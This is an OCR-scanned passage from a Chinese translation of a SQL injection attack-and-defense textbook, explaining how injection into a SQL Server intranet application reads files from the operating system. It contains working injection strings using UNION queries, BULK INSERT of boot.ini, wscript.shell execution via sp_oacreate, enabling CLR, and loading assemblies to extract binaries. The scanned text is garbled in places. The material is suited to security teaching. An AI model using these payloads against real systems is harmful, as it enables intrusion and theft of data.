的能力，很清楚地表明了攻击者怎样通过浏览器来利用这一切。我们再仔细看一个简单的使用
ASP编写的搜索应用，它以Microsof SQLServer作为后台。图6-6展示了在应用程序中输入
“%”后的搜索结果。正如读者能够预料到的（到目前为止），它返回了系统的所有用户。
000
Lame leal Sraff Thing
Q- SensePost Q
You searched for: %
jacqui rautenbach
michu vanwyk
First Name:|jacqui
Last Name: rautenbach Tel Number:|555-1212
First Name:(michu
Last Name: van wyk
Tel Number:555-1213
jaco van graan
First Name:jaco
Last Name:van graanTel Number.555-1414
JebnquoB
First Name:gert
Last Name:burger
Tel Number.555-1515
图 6-6
一个内部网应用示例（使用Microsof SQL Server作为后台）
一旦攻击者确定 sname字段易受注入攻击，他便可以通过向 select user_name(、user 或
loginame注入一个union查询米快速确定所运行的权限级别：
http://intranet/admin/staff.asp?sname= * union select
NULL, NULL, NULL, 1oginame FROM master.,sysprocesses WHERE spid = @@SPID--
240
---
## Page 255
第6章利用操作系统
结果如图6-7所示。
e00
stal Thing
1hp
SQL Server
You searched for: * union select NULL,NULL,NULL,loginame FROM
master..sysprocesses WHERE spid = @@SPID--
图6-7确认注入
有了这一信息后，攻击者继续攻击，可借助浏览器来有效复制在QueryAnalyzer程序中执
行的命令，产生下列看起来比较奇怪的查询：
http://intranet/admin/staff.asp?sname= '; create table hacked(1ine
varchar (8000)): bulk insert hacked from *c:\boot.ini';-*
该查询允许攻击者执行一个子查询以便获取最新创建的表的结果，如图6-8所示。
900
Lame Inte
emal SuafThing
p/
SQL Server
You searched for: * union select NULL,NULL,NULL,line from hacked-
First
Last
Tel
Name:
Name
Number:
[boot loader]
First
Last
Tel
Name
Name
Number:
[operating systems]
First
Name
Tel
Number:
deflaultsmuls(0)isk(0)rdisk(0)parion(1)WINNT
First
Last
Tel
muli(0)disk(0)rdisk(0)parition(13WINNT=*Microsoft Windows 2000
Name:
Name
Number:
Server fastdetect
First
Last
Number:
Tol
Name
Narme
imeout=30
图6-8通过Microsof SQLServer 读取—个文件
当然，并不是每个应用程序都会以这种便捷的方式返回结果，但是一旦完成了批量插入
（bulkinsert），攻击者便可以使用第4章和第5章介绍的挤出（extrusion）方法来从数据库提取数据。
如果在执行BULKINSERT时设置CODEPAGE-'RAW，攻击者便可以向SQLServer上传
二进制文件，当通过应用程序提取到该文件之后可以对其进行重建。SensePost编写的 Squeeza
241
---
## Page 256
SQL注入攻击与防御（第2版）
工具使用fcopy模式将该操作自动化，允许攻击者在后台临时表中执行批量插入，然后使用所
选的通信机制（DNS、错误消息、时间）来提取信息，最后再在攻击者的机器上重建该文件。可
以通过提取远程机器上任意一个二进制文件（c:winntisystcm32incLexc）并获取其MD5哈希值来
进行测试。图6-9展示了获取到的系统net.exe二进制文件的哈希值。
Coenmand Prompt
图 6-9net.exe 的 MD5 哈希值
我们使用一个针对目标应用程序的 squceza.config文件来提取两个文件—远程服务器的
boot.ini和二进制的c:winntisystem32net.exe。图6-10显示了Squeeza 相当简洁的输出。
OOharoon@hydra:~/squeeza-ssh
[haroon@hydra squeeza]$ /squeezo.rb
/
1_I
ezo tho cheeza ve.3
sp-sq>
cwintsysten32netexe stolen-net.exe
sp-so>lquit
图6-10从运程服务器复制一个二进制文件
如果一切正常，就可以读到窃取的bootini的内容并比较窃取的net.exe的校验和：
[haroon@hydra squeeza]$ cat stolen-boot.ini
[boot loader]
timeout=30
default=multi (0) disk (0) rdisk (0) partition (1) \wINNT
[operating systems]
Server" /fastdetect
[haroon@hydra squeeza]S md5sum stolen-net.exe
Bf9f01a95318fc4d5a40d4a6534fa76b stolen-net.exe
（根据所选的!charme/的不同，传输过程可能比较费力，比较慢。不过可以通过比较MD5
值来证明文件传输已顺利完成）
如果缺少批量插入方法，那么攻击者可使用OLEAutomation来实现SQLServer的文件操
作。Chris Anley 在其论文“Advanced SQL Injection”中曾介绍过 OLE Automation 技术。在Anley
的例子中，首先使用wscript.shell 对象在远程服务器上启动一个Notepad（记事本）实例：
- - wscript.shell example (Chris Anley - chris@ngssoftware,com )
242
---
## Page 257
第6章利用操作系统
declare Bo int
exec sp_oacreate *wscript.shell', @o out
exec Sp_oamethod Bo,**run*, NULL, *notepad.exe′
当然，这为攻击者使用任何ActiveX控件提供了机会，ActiveX控件可创造很多攻击机会。
在缺少批量插入方法的情况下，文件系统对象为攻击者提供了一种相对简单的读取文件的方
法。图6-11展示了在 SQLQuery Analyzer 内部使用（滥用)Scripting.FileSystemObject 的情形。
[Sg,Query Analyzer-[Query-lecahost.master.sa-Untitled2]
 9eEaQuryobrdom9e
03Ka
011ae 09t3
t,rv*0
boot loader]
ocaot (0sa(5)mater000owsn5, Co1
图6-11使用 Scripting.FileSystemObject 浏览文件系统
接下来可以使用相同的技术促使SQLServer产生浏览器实例，这些实例借助更大的复杂性
和更多的攻击因素为整个过程带来了新的变化。不难想象这样一种攻击：攻击者首先使用SQL
注入强迫服务器浏览器转向一个恶意页面，以此来利用浏览器中的漏洞。
SQLServer2005引I入了很多新的值得攻击的"特性”，其中最大的特性之一是在SQLServer
内部引入了公共语言运行时(Microsof Language Runtime，CLR)。它允许开发人员将.NET二进
制文件轻而易举地集成到数据库中并为有进取之心的攻击者提供了大量机会。MSDN上对它的
描述是：
“Microsoft SQL Server 2005 适过宿入 Microsoft .NET Framework 2.0 的 CLR 明显增强了数
据库编程模型.它支持开发人员使用任何CLR语言（尤其是Microsoft Visual C#.NET、Microsoft
Visual Basic.NET和Microsoft Visual C++)来编写存储过程、触发器和函数。它还允许开发人员
使用新的类型和技术集来扩展数据库。”
我们稍后将介绍CLR集成，现在则关注如何滥用远程系统来读取文件。可通过使用向SQL
Server导入程序集时所使用的方法米实现该目的。第一个要解决的间题是SQLServer2005默
认禁用了CLR集成。但如果拥有系统管理员或与之等价的权限，那么便不会存在此问题，因
为可以使用sp_configure存储过程重新启用该功能，如图6-12所示。
243
---
## Page 258
SQL注入攻击与防御（第2版）
RECONFIGURE;
RECONFTGURB
图6-12启用CLR集成
当然（正如在图6-13中所看到的），也可以很容易地改写这些内容以便通过注入的字符串来
运行命令。
Lame Inernal Sralf Thing
SQLServer2005
You searched for: *; exec sp_configure 'show advanced options', 1; reconfigure;
exec sp_configure *clr enabled', 1; reconfigure;--
图6-13通过应用启用 CLR集成
这样我们便可以使用CREATEASSEMBLY函数从远程服务器加载任何.NET二进制文件
至数据库中。
我们将使用下列注入字符串加载.NET程序集c:tempitest.exe：
sname=*;create assenbly sqb from *c:\temp\test.exe* vith permission_set
= unsafe--
SQL Server在sys.assembly_files表中存储原始的二进制文件（作为HEX字符串)。使用Query
Analyzer查看它很容易，如图6-14所示。
select top 1 content from sys.assembly_files
图6-14查看数据库中的关联文件
要是想使用Web页面查看该文件，就需要联合使用substringO和 master.dbo.fn_varbintohexstrO
函数：
sname=* union select NULL, NULL, NULL, master.dbo.fn_varbintohexstr
(substring (content, 1, 5)) from sys.assembly_files=-
图6-15展示了如何使用union、substring和fn_varbintohexstr 组合并通过浏览器来读取二
进制文件。
244
---
## Page 259
第6章利用操作系统
SoLSen
sys-assembly_files
ent,1,s) tron
Fint Name: Last Name: Emalk (Dx4g5a0000
图6-15使用f_varbintohexstr 和l substring读取二进制文件
SQLServer会在加载（和运行）二进制文件或程序集时进行验证以保证程序集是有效的.NET
程序集。这会妨碍我们使用CREATEASSEMBLY指令向数据库放置非CLR的二进制文件：
上述代码行产生下列输出：
malformed or not a pure .NET assembly.
Unverifiable PE Header/native stub.
幸运的是，我们可使用一些技巧来避开这种限制。首先加载一个有效的.NET二进制文件，
之后再使用ALTERASSEMBLY命令向ASSEMBLY添加补充文件。截至本书写作时，向数据
库插入补充文件时不需要进行类型检查，这样一来，我们便可以将任意二进制文件（或纯文本
ASCII文件）链接到原始程序集：
alter assembly sqb add file from 'c:\tenp\test.txt*
通过对sys.assembly_files 表进行选择操作会发现，文件已经被添加并且可使用substring/
varbintohexstr技术对其进行检索。
通常只允许SYSADMIN组（以及数据库所有者）的成员向系统目录添加文件。要想利用这
些技术，第一步是提升至系统管理员权限。
本章稍后会介绍如何通过SQLServer来执行命令。但目前请记住，几乎所有命令执行都可
以很容易地转换成远程文件读取（借助许多在利用数据库时使用的通道）。
3. Oracle
Oracle提供了多种从底层操作系统读取文件的方法，但其中大多数方法都要求能够运行